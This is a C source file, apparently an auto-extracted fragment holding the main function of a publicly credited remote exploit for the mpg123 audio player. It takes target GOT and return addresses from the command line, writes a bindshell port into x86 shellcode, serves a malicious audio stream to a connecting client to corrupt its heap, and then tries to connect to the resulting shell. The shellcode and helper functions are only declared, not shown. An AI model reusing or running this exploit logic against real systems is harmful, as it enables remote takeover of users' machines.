#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {char* p_name; int p_gotaddr; int p_requestaddr; int p_retoffset; } ;

/* Variables and functions */
 int EOF ; 
 size_t atoi (int /*<<< orphan*/ ) ; 
 char* audioserver_bind () ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 int getopt (int,char**,char*) ; 
 int /*<<< orphan*/  getshell (char*) ; 
 int gotaddr ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  platform_list () ; 
 size_t port ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int requestaddr ; 
 int retoffset ; 
 int sport ; 
 int /*<<< orphan*/  sscanf (int /*<<< orphan*/ ,char*,int*) ; 
 TYPE_1__* target ; 
 int /*<<< orphan*/  usage (char*) ; 
 int* x86_exec ; 

int main(int argc,char **argv){
 unsigned int i=0;
 int chr=0;
 char *hostptr, *nameptr="none";
 printf("[*] mpg123[v0.59r,v0.59s]: remote client-side heap corruption"
 " exploit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo/realh"
 "alo)\n\n");
 while((chr=getopt(argc,argv,"p:s:g:r:+:t:l"))!=EOF){
  switch(chr){
   case 'p':
    port=atoi(optarg);
    break;
   case 's':
    sport=atoi(optarg);
    break;
   case 'g':
    sscanf(optarg,"%x",&gotaddr);
    break;
   case 'r':
    sscanf(optarg,"%x",&requestaddr);
    break;
   case '+':
    retoffset=(atoi(optarg)*4);
    break;
   case 't':
    i=0;
    while(target[i].p_name)i++;
    if(atoi(optarg)>=i)
     printf("[!] %u is not a valid target, ignored.\n",atoi(optarg));
    else{
     nameptr=target[atoi(optarg)].p_name;
     gotaddr=target[atoi(optarg)].p_gotaddr;
     requestaddr=target[atoi(optarg)].p_requestaddr;
     retoffset=(target[atoi(optarg)].p_retoffset*4);
    }
    break;
   case 'l':
    platform_list();
    break;
   default:
    usage(argv[0]);
    break;
  }
 }
 if(!port)usage(argv[0]);
 /* verbose display.                                               */
 printf("[*] platform value base\t\t: %s.\n",nameptr);
 printf("[*] fprintf GOT address\t\t: 0x%.8x.\n",gotaddr);
 printf("[*] *request address location\t: 0x%.8x.\n",requestaddr);
 printf("[*] *request offset(+?*4)\t: %u(=%u), ret=0x%.8x.\n\n",
 (retoffset/4),retoffset,(requestaddr+retoffset));
 /* set the bindshell port in the shellcode(byte 33/34).           */
 x86_exec[33]=(sport&0xff00)>>8;
 x86_exec[34]=(sport&0x00ff);
 /* audioserver_bind() returns the host that connected to it.      */
 hostptr=audioserver_bind();
 /* check the host for success, see if the bindshell is listening. */
 getshell(hostptr);
 printf("[!] exploit failed.\n");
 exit(0);
}